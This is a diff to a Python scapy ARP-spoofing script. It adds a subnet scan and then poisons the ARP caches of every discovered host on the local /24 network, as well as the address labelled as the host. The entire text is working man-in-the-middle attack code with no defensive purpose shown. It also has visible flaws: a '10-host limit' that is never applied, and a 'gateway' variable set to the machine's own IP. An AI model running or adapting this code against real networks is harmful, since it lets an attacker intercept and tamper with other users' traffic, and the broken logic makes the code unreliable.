@@ -1,8 +1,38 @@
-from scapy.all import Ether, ARP, srp, send
-import argparse
+from scapy.all import Ether, ARP, srp, send, conf, get_if_addr
 import time
-import os
-import sys
+
+def scan_ip():
+    # Get the IP address and netmask of the default network interface
+    ip_address = conf.iface.ip
+    netmask = conf.iface.netmask
+
+    # Calculate the network address and the number of host bits
+    ip_parts = ip_address.split('.')
+    netmask_parts = netmask.split('.')
+
+    network_address = '.'.join([str(int(ip_parts[i]) & int(netmask_parts[i])) for i in range(4)])
+    # Define the IP range to scan
+    ip_range = network_address + '/24'
+
+    # Create an ARP request packet
+    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
+
+    # Send the ARP request and collect responses
+    result = srp(arp_request, timeout=2, verbose=0)[0]
+
+    target_ips = []
+    # Process the responses
+    for sent, received in result:
+        ip = received.psrc
+        mac = received.hwsrc
+        target_ips.append(ip)
+
+    #limit the size of the list to 10
+    target = target_ips[:10]
+    
+    return target_ips
+
+
 
 #Returns MAC address of any device connected to the network
 #If ip is down, returns None instead
@@ -42,21 +72,22 @@ def restore(target_ip, host_ip, verbose=True):
 
 if __name__ == "__main__":
     # victim ip address
-    target = "192.168.56.101"
     # gateway ip address
-    host = "192.168.178.24"
+    host = get_if_addr(conf.iface)
     # print progress to the screen
     verbose = True
     # enable ip forwarding
     try:
         while True:
-            # telling the `target` that we are the `host`
-            spoof(target, host, verbose)
-            # telling the `host` that we are the `target`
-            spoof(host, target, verbose)
-            # sleep for one second
-            time.sleep(1)
+            for target in scan_ip():
+                # telling the `target` that we are the `host`
+                spoof(target, host, verbose)
+                # telling the `host` that we are the `target`
+                spoof(host, target, verbose)
+                # sleep for one second
+                time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
-        restore(target, host)
-        restore(host, target)
+        for target in scan_ip():
+            restore(target, host)
+            restore(host, target)
